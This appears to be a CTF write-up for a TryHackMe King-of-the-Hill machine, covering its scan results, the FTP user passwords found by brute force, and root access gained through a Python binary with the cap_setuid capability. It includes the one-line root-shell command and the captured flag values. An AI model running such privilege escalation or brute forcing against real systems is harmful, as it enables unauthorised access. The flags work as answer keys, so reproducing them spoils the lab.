
THM-KOTH: Hackers
============================

> labruhtooryboi | month day, year


# 10.10.1.50 
# hackers.thm


					# reconnisance

'''
Open 10.10.1.50:21
Open 10.10.1.50:22
Open 10.10.1.50:80
Open 10.10.1.50:9999
'''

'''
Nmap scan report for 10.10.1.50
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.27.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ff:ea:b0:58:35:79:df:b3:c1:57:01:43:09:be:2a:d5 (RSA)
|   256 3b:ff:4a:88:4f:dc:03:31:b6:9b:dd:ea:69:85:b0:af (ECDSA)
|_  256 fa:fd:4c:0a:03:b6:f7:1c:ee:f8:33:43:dc:b4:75:41 (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ellingson Mineral Company
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Tue, 29 Dec 2020 15:09:27 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Tue, 29 Dec 2020 15:09:26 GMT
|     Content-Length: 1
|_    Content-Type: text/plain; charset=utf-8
1 service unrecognized despite returning data
'''




					# enumeration

'''
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
'''

'''
[21][ftp] host: 10.10.1.50   login: rcampbell   password: walter
[21][ftp] host: 10.10.1.50   login: gcrawford   password: mandi
'''




					# privelage escalation

*as campbell				
'''
getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
'''

'''
python3 -c "import os, pty; os.setuid(0); pty.spawn('/bin/bash')"
'''


					# interesting things

>flags
'''
/root/.flag
thm{b94f8d2e715973f8bc75fe099c8492c4}
'''

'''
/home/tryhackme/.flag
thm{3ce2fe64055d3b543360c3fc880194f8}
'''

'''
/home/rcampbell/.flag
thm{12361ad240fec43005844016092f1e05}
'''

'''
/home/productions/.flag
thm{879f3238fb0a4bf1c23fd82032d237ff}
'''

'''
/var/ftp/.flag
thm{678d0231fb4e2150afc1c4e336fcf44d}
'''

'''
/home/gcrawford/business.txt
/etc/ssh/sshd_config
'''

'''
/home/productions/webserver/resources/main.css
thm{b63670f7192689782a45d8044c63197f}
'''

'''
/etc/vsftpd.conf
thm{2124a8091b664c98a0e5bdbb7a4fa1cb}
'''

'''
/etc/ssh/sshd_config
thm{068754683abe0bf81fb621ce55a91964}
'''



>users
'''
root
gcrawford
rcampbell
tryhackme
'''

'''
'''

>passwds
'''
"I think these change for every new instance of the machine"
'''



>files and dirs
'''
/usr/bin/python3
'''

'''
'''

>root stuff 
'''
'''

'''
'''
